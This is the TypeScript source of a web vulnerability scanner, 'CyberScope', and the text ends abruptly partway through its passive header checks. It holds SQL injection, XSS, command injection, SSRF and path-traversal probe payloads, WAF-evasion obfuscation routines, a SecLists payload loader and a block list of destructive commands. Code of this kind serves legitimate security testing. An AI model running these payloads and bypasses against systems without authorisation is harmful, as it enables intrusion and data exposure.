import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import {
  enforceZeroPayloadGate,
  applyGauntletVerdict,
  aiReviewAllowed,
  verdictFromResponse,
  resolveTargetProtocol,
  browserHeaders,
} from "../_shared/security-gates.ts";
import { createEvidencePackage } from "../_shared/proof-packages.ts";
import { confirmFinding } from "../_shared/ai-confirm-gate.ts";

// ─── GLOBAL TIMEOUT HELPER ─────────────────────────────
const SCAN_START = Date.now();
const MAX_SCAN_MS = 50000; // 50s hard limit (edge fn = 60s)
function timeLeft(): number { return MAX_SCAN_MS - (Date.now() - SCAN_START); }
function isTimedOut(): boolean { return timeLeft() <= 0; }

async function safeFetch(url: string, opts: RequestInit = {}, timeoutMs = 8000): Promise<Response> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    return await fetch(url, { ...opts, signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ─── ADAPTIVE DRIFT MUTATION HELPERS ────────────────────
// Applies WAF-bypass obfuscations driven by detected drift strategies.
function applyDriftMutation(payload: string, techniques: string[]): string {
  if (!payload || techniques.length === 0) return payload;
  let out = payload;
  for (const tech of techniques) {
    if (tech.includes("case-mutation")) {
      out = out.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join("");
    }
    if (tech.includes("url-encode")) {
      out = encodeURIComponent(out);
    }
    if (tech.includes("unicode")) {
      out = out.split("").map(c =>
        /[a-zA-Z]/.test(c) ? `\\u00${c.charCodeAt(0).toString(16).padStart(2, "0")}` : c
      ).join("");
    }
    if (tech.includes("fromCharCode") && /alert|script/i.test(payload)) {
      out = out.replace(/alert\(([^)]+)\)/gi, (_m, arg) =>
        `eval(String.fromCharCode(${[...`alert(${arg})`].map(c => c.charCodeAt(0)).join(",")}))`);
    }
    if (tech.includes("chunked")) {
      // No-op at payload level (transport encoding) — annotated for the request layer
      out = `/*chunked*/${out}`;
    }
  }
  return out;
}

// ─── SECLISTS PAYLOAD LOADER (Phase 11) ─────────────────
const SECLISTS_BASE = "https://raw.githubusercontent.com/danielmiessler/SecLists/master";
const SECLISTS_PATHS: Record<string, string> = {
  sqli: "Fuzzing/SQLi/quick-SQLi.txt",
  "sqli-mysql": "Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt",
  rxss: "Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt",
  cmdi: "Fuzzing/command-injection-commix.txt",
  "path-traversal": "Fuzzing/LFI/LFI-Jhaddix.txt",
  lfi: "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
  ssti: "Fuzzing/SSI-Injection/SSI-Injection.txt",
  nosqli: "Fuzzing/NoSQL-Injection/NoSQLi.txt",
};

const seclistsCache = new Map<string, string[]>();
async function loadSecListsPayloads(vulnClass: string, limit = 20, driftTechniques: string[] = []): Promise<string[]> {
  const path = SECLISTS_PATHS[vulnClass];
  if (!path) return [];
  let base: string[];
  if (seclistsCache.has(vulnClass)) {
    base = seclistsCache.get(vulnClass)!.slice(0, limit);
  } else {
    try {
      const resp = await safeFetch(`${SECLISTS_BASE}/${path}`, { headers: { "User-Agent": "CyberScope/1.0" } }, 5000);
      if (!resp.ok) return [];
      const lines = (await resp.text()).split("\n").map(l => l.trim()).filter(l => l && !l.startsWith("#"));
      seclistsCache.set(vulnClass, lines);
      base = lines.slice(0, limit);
    } catch { return []; }
  }
  // If drift detected, prepend obfuscated variants so mutated payloads run first
  if (driftTechniques.length > 0) {
    const mutated = base.map((p) => applyDriftMutation(p, driftTechniques));
    return [...mutated, ...base].slice(0, limit);
  }
  return base;
}

// ─── TECH LEAK DETECTION (Phase 11: SecListsFeedback) ───
const TECH_LEAK_PATTERNS: Array<{ pattern: RegExp; tech: string; dbType?: string }> = [
  { pattern: /MySQL/i, tech: "MySQL", dbType: "mysql" },
  { pattern: /PostgreSQL/i, tech: "PostgreSQL", dbType: "postgres" },
  { pattern: /Microsoft SQL Server|MSSQL/i, tech: "MSSQL", dbType: "mssql" },
  { pattern: /MongoDB/i, tech: "MongoDB", dbType: "mongodb" },
  { pattern: /ORA-\d{4,5}/i, tech: "Oracle", dbType: "oracle" },
];

function detectDbFromError(body: string): string | null {
  for (const p of TECH_LEAK_PATTERNS) {
    if (p.pattern.test(body) && p.dbType) return p.dbType;
  }
  return null;
}

// ─── PHASE 8: Learning Engine Types ─────────────────────
interface ExperienceRecord {
  target_id: string | null;
  tech_stack: Record<string, string | undefined>;
  vuln_class: string;
  payload_used: string;
  http_method: string;
  response_status: number | null;
  response_length: number | null;
  response_snippet: string | null;
  outcome: "confirmed" | "false_positive" | "blocked" | "error";
  confidence_score: number;
  reward_score: number;
  metadata: Record<string, unknown>;
}

const REWARD_TABLE: Record<string, number> = {
  unique_path_found: 10, filter_bypassed: 10, true_positive_confirmed: 10,
  new_method_discovered: 8, high_confidence_finding: 7, execution_evidence: 9,
  waf_blocked: -5, false_positive: -5, "404_hit": -5,
  timeout: -3, rate_limited: -4, low_confidence_noise: -3,
};

// Evolutionary mutation operators for genetic payload evolution
const GENETIC_MUTATIONS: Array<{ name: string; mutate: (s: string) => string }> = [
  { name: "url_encode_special", mutate: (p) => p.replace(/[<>"'&;|`]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`) },
  { name: "double_url_encode", mutate: (p) => p.replace(/[<>"'&;|`]/g, (c) => `%25${c.charCodeAt(0).toString(16).toUpperCase()}`) },
  { name: "null_byte_prefix", mutate: (p) => `%00${p}` },
  { name: "newline_break", mutate: (p) => p.replace(/ /g, "%0a") },
  { name: "concat_split", mutate: (p) => {
    if (p.includes("SELECT")) return p.replace("SELECT", "SEL"+"ECT");
    if (p.includes("script")) return p.replace("script", "scr"+"ipt");
    return p + "/**/";
  }},
];

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

function supabaseAdmin() {
  return createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
  );
}

async function log(
  db: ReturnType<typeof createClient>,
  targetId: string,
  taskId: string,
  type: "thought" | "action" | "result" | "error" | "info",
  message: string,
  metadata: Record<string, unknown> = {}
) {
  try {
    await db.from("scan_logs").insert({
      target_id: targetId,
      task_id: taskId,
      log_type: type,
      message,
      metadata,
    });
  } catch { /* don't let logging failures crash the scan */ }
}

// ─── SAFE PAYLOADS ONLY ──────────────────────────────────
const FORBIDDEN_PATTERNS = [
  /drop\s+table/i, /truncate/i, /delete\s+from/i, /rm\s+-rf/i,
  /shutdown/i, /xp_cmdshell/i, /format\s+c:/i,
];

function isSafePayload(payload: string): boolean {
  return !FORBIDDEN_PATTERNS.some((p) => p.test(payload));
}

// ─── RESPONSE-PAYLOAD CORRELATION (LogicVerifier) ───────
function analyzeExecutionEvidence(vulnClass: string, payload: string, responseBody: string, baselineBody: string): { hasEvidence: boolean; evidenceType: string; details: string; confidenceBoost: number } {
  const result = { hasEvidence: false, evidenceType: "none", details: "No execution evidence", confidenceBoost: 0 };
  const sqlErrors = [/you have an error in your sql syntax/i, /mysql_fetch/i, /pg_query/i, /ORA-\d{4,5}/i, /SQLSTATE\[/i, /PDOException/i, /unclosed quotation mark/i, /syntax error at or near/i];
  const cmdiEvidence = [/uid=\d+\(/, /root:.*:0:0/, /cyberscope_marker/, /bin\/bash/, /bin\/sh/];
  const pathEvidence = [/root:.*:0:0/, /\[boot loader\]/i, /bin\//, /etc\/passwd/];

  if (vulnClass === "sqli" || vulnClass === "auth-bypass") {
    for (const p of sqlErrors) { if (p.test(responseBody) && !p.test(baselineBody)) { result.hasEvidence = true; result.evidenceType = "sql_error"; result.details = `DB error: ${p.source}`; result.confidenceBoost = 25; return result; } }
    const ratio = Math.abs(responseBody.length - baselineBody.length) / Math.max(baselineBody.length, 1);
    if (ratio > 0.3) { result.hasEvidence = true; result.evidenceType = "body_change"; result.details = `Body changed ${(ratio*100).toFixed(1)}%`; result.confidenceBoost = 15; }
  } else if (vulnClass === "rxss" || vulnClass === "stored-xss") {
    if (responseBody.includes("<cyberscope>") || responseBody.includes("onerror=cyberscope")) { result.hasEvidence = true; result.evidenceType = "xss_unescaped"; result.details = "Probe reflected unescaped"; result.confidenceBoost = 30; }
  } else if (vulnClass === "cmdi") {
    for (const p of cmdiEvidence) { if (p.test(responseBody) && !p.test(baselineBody)) { result.hasEvidence = true; result.evidenceType = "cmd_output"; result.details = `Cmd evidence: ${p.source}`; result.confidenceBoost = 30; return result; } }
  } else if (vulnClass === "ssti") {
    if (/\b49\b/.test(responseBody) && !/\b49\b/.test(baselineBody)) { result.hasEvidence = true; result.evidenceType = "template_eval"; result.details = "7*7=49 evaluated"; result.confidenceBoost = 28; }
  } else if (vulnClass === "path-traversal" || vulnClass === "lfi") {
    for (const p of pathEvidence) { if (p.test(responseBody)) { result.hasEvidence = true; result.evidenceType = "file_leak"; result.details = `File content: ${p.source}`; result.confidenceBoost = 30; return result; } }
  } else if (vulnClass === "xxe") {
    if (responseBody.includes("cyberscope") && !baselineBody.includes("cyberscope")) { result.hasEvidence = true; result.evidenceType = "entity_expansion"; result.details = "XXE entity expanded"; result.confidenceBoost = 30; }
  } else if (vulnClass === "ssrf") {
    if (/169\.254\.169\.254|metadata|ami-id/.test(responseBody) && !/169\.254\.169\.254/.test(baselineBody)) { result.hasEvidence = true; result.evidenceType = "internal_data"; result.details = "Internal service data"; result.confidenceBoost = 28; }
  }
  return result;
}

// ─── VERSION SANITY CHECK (Backported Patches) ──────────
function checkVersionSanity(detectedVersion: string, serverHeader: string): { shouldSuppress: boolean; reason: string } {
  const allHeaders = `${detectedVersion} ${serverHeader}`.toLowerCase();
  const backportMarkers = [/\.el\d+/i, /\.deb\d+/i, /ubuntu/i, /\.amzn\d+/i, /\.fc\d+/i];
  const distroNames = ["rhel", "centos", "debian", "ubuntu", "fedora", "amazon linux", "suse"];
  for (const marker of backportMarkers) {
    if (marker.test(allHeaders)) return { shouldSuppress: true, reason: `Enterprise build detected (${marker.source}) — backported patches likely` };
  }
  for (const name of distroNames) {
    if (allHeaders.includes(name)) return { shouldSuppress: true, reason: `${name} detected — security fixes likely backported` };
  }
  return { shouldSuppress: false, reason: "No backport indicators" };
}

// ─── 1. COMPREHENSIVE HEURISTIC ROUTER ──────────────────

interface VulnCheck {
  paramName: string;
  paramValue: string;
  vulnClasses: string[];
  url: string;
  endpointId: string;
}

function classifyParameters(
  endpoints: Array<{ id: string; url: string; parameters: Record<string, string> }>
): VulnCheck[] {
  const checks: VulnCheck[] = [];

  const paramClassMap: Record<string, string[]> = {
    id: ["sqli", "idor"], user_id: ["sqli", "idor"], item_id: ["sqli", "idor"],
    order_id: ["sqli", "idor"], product_id: ["sqli", "idor"],
    category: ["sqli"], sort: ["sqli"], order: ["sqli"],
    filter: ["sqli", "nosqli"], where: ["sqli"],
    username: ["nosqli", "auth-bypass"], email: ["nosqli", "auth-bypass"],
    password: ["auth-bypass"], login: ["auth-bypass"],
    cmd: ["cmdi"], command: ["cmdi"], exec: ["cmdi"],
    ping: ["cmdi"], host: ["cmdi", "ssrf"], ip: ["cmdi", "ssrf"],
    filename: ["cmdi", "path-traversal"], dir: ["cmdi", "path-traversal"],
    cn: ["ldapi"], dn: ["ldapi"], uid: ["ldapi"],
    ou: ["ldapi"], dc: ["ldapi"],
    url: ["ssrf", "open-redirect"], redirect: ["open-redirect"],
    redirect_url: ["open-redirect"], redirect_uri: ["open-redirect"],
    return_url: ["open-redirect"], next: ["open-redirect"],
    callback: ["ssrf", "open-redirect"], dest: ["open-redirect"],
    target: ["ssrf"], uri: ["ssrf"], link: ["ssrf", "open-redirect"],
    webhook: ["ssrf"], proxy: ["ssrf"], fetch: ["ssrf"],
    q: ["rxss"], search: ["rxss"], query: ["rxss", "sqli"],
    keyword: ["rxss"], name: ["rxss", "stored-xss"],
    message: ["rxss", "stored-xss"], comment: ["rxss", "stored-xss"],
    title: ["stored-xss"], body: ["stored-xss"],
    content: ["stored-xss"], bio: ["stored-xss"],
    file: ["path-traversal", "lfi"], path: ["path-traversal"],
    page: ["path-traversal", "lfi"], doc: ["path-traversal"],
    folder: ["path-traversal"], include: ["lfi"],
    template: ["ssti", "lfi"], lang: ["ssti"], view: ["ssti"],
    layout: ["ssti"],
    xml: ["xxe"], data: ["xxe", "deserialization"],
    input: ["xxe", "rxss"], payload: ["deserialization"],
    token: ["deserialization", "auth-bypass"],
    session: ["deserialization", "auth-bypass"],
    object: ["deserialization"], state: ["deserialization"],
    viewstate: ["deserialization"],
    account_id: ["idor"], profile_id: ["idor"],
    doc_id: ["idor"], file_id: ["idor"],
    invoice_id: ["idor"], report_id: ["idor"],
    role: ["privilege-escalation"], admin: ["privilege-escalation"],
    is_admin: ["privilege-escalation"], access_level: ["privilege-escalation"],
    permissions: ["privilege-escalation"],
    // Additional common params for deeper testing
    cat: ["sqli", "rxss"], artist: ["sqli", "rxss"],
    listid: ["sqli"], action: ["rxss", "cmdi"],
  };

  for (const ep of endpoints) {
    const params = ep.parameters || {};
    for (const [paramName, paramValue] of Object.entries(params)) {
      const key = paramName.toLowerCase();
      const vulnClasses = paramClassMap[key] || [];
      if (vulnClasses.length > 0) {
        checks.push({
          paramName,
          paramValue: String(paramValue),
          vulnClasses,
          url: ep.url,
          endpointId: ep.id,
        });
      }
    }
  }

  return checks;
}

// ─── 2. DIFFERENTIAL VALIDATOR WITH INTRUDER/REPEATER ───

interface DiffResult {
  isVulnerable: boolean;
  vulnClass: string;
  confidence: "high" | "medium" | "low";
  confidenceScore: number; // 0-100
  baseline: { status: number; length: number; headers: Record<string, string>; bodySnippet: string };
  mutated: { status: number; length: number; headers: Record<string, string>; bodySnippet: string };
  truePayload: string;
  falsePayload: string;
  adaptationUsed?: string;
  owaspCategory: string;
  requestData: { method: string; url: string; headers: Record<string, string>; param: string; payload: string };
  responseData: { status: number; headers: Record<string, string>; bodySnippet: string; length: number };
  intruderResults?: Array<{ payload: string; status: number; length: number; timingMs: number }>;
}

const OWASP_MAP: Record<string, string> = {
  sqli: "A03:2021 Injection",
  nosqli: "A03:2021 Injection",
  cmdi: "A03:2021 Injection",
  ldapi: "A03:2021 Injection",
  rxss: "A03:2021 Injection",
  "stored-xss": "A03:2021 Injection",
  "dom-xss": "A03:2021 Injection",
  ssti: "A03:2021 Injection",
  xxe: "A05:2021 Security Misconfiguration",
  "auth-bypass": "A07:2021 Identification and Authentication Failures",
  "privilege-escalation": "A01:2021 Broken Access Control",
  idor: "A01:2021 Broken Access Control",
  "open-redirect": "A01:2021 Broken Access Control",
  ssrf: "A10:2021 Server-Side Request Forgery",
  "path-traversal": "A01:2021 Broken Access Control",
  lfi: "A01:2021 Broken Access Control",
  deserialization: "A08:2021 Software and Data Integrity Failures",
  "security-misconfig": "A05:2021 Security Misconfiguration",
  "sensitive-data": "A02:2021 Cryptographic Failures",
  "known-vuln": "A06:2021 Vulnerable and Outdated Components",
  "insufficient-logging": "A09:2021 Security Logging and Monitoring Failures",
};

function getTestPairs(paramValue: string): Record<string, { truthy: string; falsy: string }> {
  return {
    sqli: { truthy: `${paramValue}' AND '1'='1`, falsy: `${paramValue}' AND '1'='0` },
    nosqli: { truthy: `${paramValue}[$ne]=impossible_value_12345`, falsy: paramValue },
    cmdi: { truthy: `${paramValue}; echo cyberscope_marker`, falsy: paramValue },
    ldapi: { truthy: `${paramValue})(|(cn=*`, falsy: paramValue },
    rxss: { truthy: `${paramValue}<cyberscope>`, falsy: paramValue },
    "stored-xss": { truthy: `${paramValue}<img src=x onerror=cyberscope>`, falsy: paramValue },
    "open-redirect": { truthy: "https://safe-test.cyberscope.local", falsy: paramValue },
    ssrf: { truthy: "http://127.0.0.1:1", falsy: paramValue },
    idor: { truthy: "999999", falsy: paramValue },
    "path-traversal": { truthy: "....//....//etc/hostname", falsy: paramValue },
    lfi: { truthy: "....//....//etc/hostname", falsy: paramValue },
    ssti: { truthy: "{{7*7}}", falsy: "{{invalid}}" },
    xxe: {
      truthy: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "cyberscope">]><foo>&xxe;</foo>',
      falsy: '<?xml version="1.0"?><foo>safe</foo>',
    },
    "auth-bypass": { truthy: `${paramValue}' OR '1'='1`, falsy: paramValue },
    deserialization: { truthy: 'O:8:"stdClass":0:{}', falsy: paramValue },
    "privilege-escalation": { truthy: "admin", falsy: paramValue },
  };
}

// Intruder payloads for deeper verification per vuln class
function getIntruderPayloads(vulnClass: string, paramValue: string, adaptivePayloads: string[] = []): string[] {
  const base: Record<string, string[]> = {
    sqli: [
      `${paramValue}' OR 1=1--`, `${paramValue}" OR "1"="1`, `${paramValue}' UNION SELECT NULL--`,
      `${paramValue}' AND SLEEP(0)--`, `${paramValue}/**/OR/**/1=1`,
    ],
    rxss: [
      `${paramValue}"><svg onload=alert(1)>`, `${paramValue}'><img src=x>`,
      `${paramValue}<details open ontoggle=alert(1)>`, `javascript:alert(1)//`,
    ],
    cmdi: [
      `${paramValue}|echo test`, `${paramValue}\`echo test\``,
      `${paramValue}$(echo test)`, `${paramValue};id`,
    ],
    ssrf: [
      "http://127.0.0.1:80", "http://[::1]", "http://0x7f000001",
      "http://localhost:8080", "http://169.254.169.254/latest/meta-data/",
    ],
    "path-traversal": [
      "..%2f..%2f..%2fetc/passwd", "....//....//....//etc/passwd",
      "..\\..\\..\\etc\\passwd", "%252e%252e%252fetc/passwd",
    ],
    ssti: [
      "${7*7}", "{{7*'7'}}", "<%= 7*7 %>", "#{7*7}",
    ],
  };
  return [...new Set([...(adaptivePayloads || []), ...(base[vulnClass] || [])])].filter(Boolean).slice(0, 12);
}

const MUTATIONS: Array<{ name: string; transform: (s: string) => string }> = [
  { name: "URL Encoding", transform: (s) => s.replace(/[^a-zA-Z0-9_.~-]/g, (c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`) },
  { name: "Double Hex Encoding", transform: (s) => s.replace(/[^a-zA-Z0-9]/g, (c) => `%25${c.charCodeAt(0).toString(16).toUpperCase()}`) },
  { name: "Unicode Escape", transform: (s) => s.replace(/['"<>&]/g, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`) },
  { name: "Whitespace Variation", transform: (s) => s.replace(/ /g, "/**/") },
  { name: "Case Toggle", transform: (s) => s.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join("") },
];

const MAX_ADAPTIVE_RETRIES = 3;

function captureHeaders(resp: Response): Record<string, string> {
  const h: Record<string, string> = {};
  resp.headers.forEach((v, k) => { h[k] = v; });
  return h;
}

async function runDifferentialTest(
  baseUrl: string,
  paramName: string,
  paramValue: string,
  vulnClass: string,
  overrideTruthyPayload?: string
): Promise<DiffResult | null> {
  const testPairs = getTestPairs(paramValue);
  const pair = testPairs[vulnClass];
  if (!pair) return null;
  const truthyPayload = overrideTruthyPayload || pair.truthy;
  if (!isSafePayload(truthyPayload) || !isSafePayload(pair.falsy)) return null;

  const payloadsToTry = [
    { payload: truthyPayload, name: overrideTruthyPayload ? "override" : "original" },
    ...MUTATIONS.slice(0, MAX_ADAPTIVE_RETRIES).map((m) => ({
      payload: m.transform(truthyPayload),
      name: m.name,
    })),
  ];

  for (const attempt of payloadsToTry) {
    if (!isSafePayload(attempt.payload)) continue;

    try {
      const url = new URL(baseUrl);
      const reqHeaders = { "User-Agent": "CyberScope-Scanner/1.0", "X-CyberScope-Token": "audit-scan" };

      // Truthy (mutated) test
      url.searchParams.set(paramName, attempt.payload);
      const trueStart = Date.now();
      const trueResp = await safeFetch(url.toString(), { method: "GET", headers: reqHeaders, redirect: "manual" }, 6000);
      const trueBody = await trueResp.text();
      const trueTiming = Date.now() - trueStart;
      const trueHeaders = captureHeaders(trueResp);

      await new Promise((r) => setTimeout(r, 50));

      // Falsy (baseline) test
      url.searchParams.set(paramName, pair.falsy);
      const falseResp = await safeFetch(url.toString(), { method: "GET", headers: reqHeaders, redirect: "manual" }, 6000);
      const falseBody = await falseResp.text();
      const falseHeaders = captureHeaders(falseResp);

      // If blocked, try next mutation
      if ([403, 406, 429].includes(trueResp.status) && attempt.name !== payloadsToTry[payloadsToTry.length - 1].name) {
        await new Promise((r) => setTimeout(r, 200));
        continue;
      }

      // ─── Response-Payload Correlation (LogicVerifier) ───
      const executionEvidence = analyzeExecutionEvidence(vulnClass, attempt.payload, trueBody, falseBody);

      const result: DiffResult = {
        isVulnerable: false,
        vulnClass,
        confidence: "low",
        confidenceScore: 0,
        baseline: { status: falseResp.status, length: falseBody.length, headers: falseHeaders, bodySnippet: falseBody.slice(0, 500) },
        mutated: { status: trueResp.status, length: trueBody.length, headers: trueHeaders, bodySnippet: trueBody.slice(0, 500) },
        truePayload: attempt.payload,
        falsePayload: pair.falsy,
        adaptationUsed: attempt.name !== "original" ? attempt.name : undefined,
        owaspCategory: OWASP_MAP[vulnClass] || "Unknown",
        requestData: { method: "GET", url: url.toString(), headers: reqHeaders, param: paramName, payload: attempt.payload },
        responseData: { status: trueResp.status, headers: trueHeaders, bodySnippet: trueBody.slice(0, 500), length: trueBody.length },
      };

      // ─── Differential Analysis per vuln class (STRICT thresholds) ───
      if (vulnClass === "sqli" || vulnClass === "auth-bypass") {
        const lengthDiff = Math.abs(trueBody.length - falseBody.length);
        const statusDiff = trueResp.status !== falseResp.status;
        // STRICT: Require BOTH length diff >200 AND status diff, OR execution evidence
        if (executionEvidence.hasEvidence) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 85;
        } else if (lengthDiff > 200 && statusDiff) {
          result.isVulnerable = true;
          result.confidence = "medium";
          result.confidenceScore = 65;
        } else if (lengthDiff > 500) {
          // Very large diff without status change — still suspicious
          result.isVulnerable = true;
          result.confidence = "medium";
          result.confidenceScore = 55;
        }
        // Removed: lengthDiff > 50 alone was causing FPs
      } else if (vulnClass === "nosqli") {
        if (trueResp.status !== falseResp.status && Math.abs(trueBody.length - falseBody.length) > 100) {
          result.isVulnerable = true;
          result.confidence = "medium";
          result.confidenceScore = 60;
        }
      } else if (vulnClass === "cmdi") {
        if (trueBody.includes("cyberscope_marker") || /uid=\d+\(/.test(trueBody)) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 95;
        }
        // Removed: status 500 alone was causing FPs — many apps return 500 for bad input
      } else if (vulnClass === "ldapi") {
        if (trueResp.status !== falseResp.status && Math.abs(trueBody.length - falseBody.length) > 200) {
          result.isVulnerable = true;
          result.confidence = "medium";
          result.confidenceScore = 55;
        }
      } else if (vulnClass === "rxss" || vulnClass === "stored-xss") {
        if (trueBody.includes("<cyberscope>") || trueBody.includes("onerror=cyberscope") || trueBody.includes("onload=cyberscope")) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 90;
        }
        // Only count as vuln if our exact probe is reflected — no heuristic guessing
      } else if (vulnClass === "open-redirect") {
        const location = trueResp.headers.get("location") || "";
        // STRICT: Require that the Location header HOST is our attacker-controlled host,
        // not just that the payload string appears in the URL (which happens when the server
        // simply echoes the query param back into the canonical Location for trailing-slash redirects).
        let isAttackerHost = false;
        try {
          if (location) {
            const parsed = new URL(location, trueResp.url);
            isAttackerHost = parsed.hostname === "safe-test.cyberscope.local";
          }
        } catch { /* ignore */ }
        if (trueResp.status >= 300 && trueResp.status < 400 && isAttackerHost) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 90;
        }
      } else if (vulnClass === "ssrf") {
        // STRICT: Require actual internal data in response, not just status diff
        if (/169\.254\.169\.254|ami-id|instance-id|metadata/.test(trueBody) && !/169\.254\.169\.254/.test(falseBody)) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 85;
        } else if (trueResp.status === 500) {
          // Rule 5: 500 is only a TP if the body has an explicit stack trace / leak.
          const v = verdictFromResponse({
            status: 500, body: trueBody,
            diffBytes: Math.abs(trueBody.length - falseBody.length),
          });
          if (v.result === "true_positive") {
            result.isVulnerable = true;
            result.confidence = "medium";
            result.confidenceScore = v.confidence;
          }
          // else: 500 with no leak → False Positive, not flagged.
        }
      } else if (vulnClass === "idor" || vulnClass === "privilege-escalation") {
        if (trueResp.status === 200 && falseResp.status === 200) {
          const lengthDiff = Math.abs(trueBody.length - falseBody.length);
          if (lengthDiff > 300) {
            result.isVulnerable = true;
            result.confidence = "medium";
            result.confidenceScore = 55;
          }
        }
      } else if (vulnClass === "ssti") {
        // STRICT: Require BOTH (a) the eval result "49" appears in mutated, (b) "49" is absent
        // from baseline, AND (c) the literal probe "{{7*7}}" is NOT reflected verbatim
        // (verbatim reflection means template engine did NOT evaluate it = false positive).
        const evalPresent = /\b49\b/.test(trueBody);
        const evalAbsentInBaseline = !/\b49\b/.test(falseBody);
        const literalReflected = trueBody.includes("{{7*7}}") || trueBody.includes("{{ 7*7 }}");
        if (evalPresent && evalAbsentInBaseline && !literalReflected) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 88;
        }
      } else if (vulnClass === "path-traversal" || vulnClass === "lfi") {
        // STRICT: Require actual file content patterns, not just length diff
        if (/root:.*:0:0/.test(trueBody) || /\[boot loader\]/i.test(trueBody)) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 95;
        } else if (/\/bin\/bash|\/bin\/sh|\/usr\/sbin/.test(trueBody) && !falseBody.includes("/bin/")) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 85;
        }
        // Removed: length diff alone was causing massive FPs
      } else if (vulnClass === "xxe") {
        if (trueBody.includes("cyberscope") && !falseBody.includes("cyberscope")) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 90;
        }
        // Removed: status diff alone was causing FPs
      } else if (vulnClass === "deserialization") {
        if (trueBody.includes("unserialize") || trueBody.includes("ClassNotFoundException") || trueBody.includes("ObjectInputStream")) {
          result.isVulnerable = true;
          result.confidence = "high";
          result.confidenceScore = 85;
        }
        // Removed: status 500 alone — too many apps return 500 for bad input
      }

      // ─── Apply execution evidence boost ───
      if (executionEvidence.hasEvidence) {
        result.isVulnerable = true;
        result.confidenceScore = Math.min(result.confidenceScore + executionEvidence.confidenceBoost, 99);
        if (result.confidenceScore >= 80) result.confidence = "high";
      } else if (result.isVulnerable && executionEvidence.confidenceBoost < 0) {
        result.confidenceScore = Math.max(result.confidenceScore + executionEvidence.confidenceBoost, 10);
        if (result.confidenceScore < 50) result.confidence = "low";
      }

      // ─── Intruder Mode: run additional payloads for confirmed vulns ───
      if (result.isVulnerable) {
        const intruderPayloads = getIntruderPayloads(vulnClass, paramValue, [
          ...(highYieldPayloads.get(vulnClass) || []),
          ...(secListsPayloadsMap.get(vulnClass) || []).slice(0, 6),
        ]);
        const intruderResults: Array<{ payload: string; status: number; length: number; timingMs: number }> = [];

        for (const ip of intruderPayloads.slice(0, 5)) {
          if (!isSafePayload(ip)) continue;
          try {
            const iUrl = new URL(baseUrl);
            iUrl.searchParams.set(paramName, ip);
            const start = Date.now();
            const iResp = await safeFetch(iUrl.toString(), { method: "GET", headers: reqHeaders, redirect: "manual" }, 5000);
            const iBody = await iResp.text();
            intruderResults.push({ payload: ip, status: iResp.status, length: iBody.length, timingMs: Date.now() - start });
            await new Promise((r) => setTimeout(r, 100));
          } catch { /* skip */ }
        }

        result.intruderResults = intruderResults;

        // Only count intruder hits where response differs significantly from baseline
        const successfulIntruder = intruderResults.filter((ir) => {
          // 2xx alone is NOT evidence — most apps return 200 for any input
          // Require significant length difference from baseline to count
          const baseLen = result.baseline.length;
          const lenDiff = Math.abs(ir.length - baseLen);
          const lenRatio = lenDiff / Math.max(baseLen, 1);
          return (ir.status === 200 && lenRatio > 0.25) || (ir.status === 500 && lenRatio > 0.1);
        }).length;
        if (successfulIntruder >= 2) {
          result.confidenceScore = Math.min(result.confidenceScore + 15, 99);
          if (result.confidenceScore >= 80) result.confidence = "high";
        }
      }

      return result;
    } catch (e) {
      console.error(`Differential test error for ${vulnClass} (${attempt.name}):`, e);
    }
  }
  return null;
}

// ─── 3. PASSIVE SECURITY CHECKS ─────────────────────────

interface PassiveResult {
  check: string;
  vulnClass: string;
  owaspCategory: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  description: string;
  remediation: string;
}

async function runPassiveChecks(domain: string): Promise<PassiveResult[]> {
  const results: PassiveResult[] = [];

  try {
    const resp = await safeFetch(`https://${domain}`, {
      method: "GET",
      headers: { "User-Agent": "CyberScope-Scanner/1.0" },
      redirect: "follow",
    }, 6000);

    const headers = Object.fromEntries(resp.headers.entries());
    const body = await resp.text();

    const securityHeaders: Array<{ header: string; title: string; desc: string; severity: "medium" | "low" | "info" }> = [
      { header: "strict-transport-security", title: "Missing HSTS Header", desc: "Strict-Transport-Security header is not set, enabling potential MITM downgrade attacks.", severity: "medium" },
      { header: "x-content-type-options", title: "Missing X-Content-Type-Options", desc: "X-Content-Type-Options: nosniff is not set, enabling MIME-type confusion attacks.", severity: "low" },
      { header: "x-frame-options", title: "Missing X-Frame-Options", desc: "X-Frame-Options is not set, making the application vulnerable to clickjacking.", severity: "medium" },
      { header: "content-security-policy", title: "Missing Content-Security-Policy", desc: "No CSP header found. This enables XSS and data injection attacks.", severity: "medium" },
      { header: "x-xss-protection", title: "Missing X-XSS-Protection", desc: "X-XSS-Protection header is not configured.", severity: "low" },
      { header: "referrer-policy", title: "Missing Referrer-Policy", desc: "No Referrer-Policy set, potentially leaking sensitive URL paths to third parties.", severity: "low" },
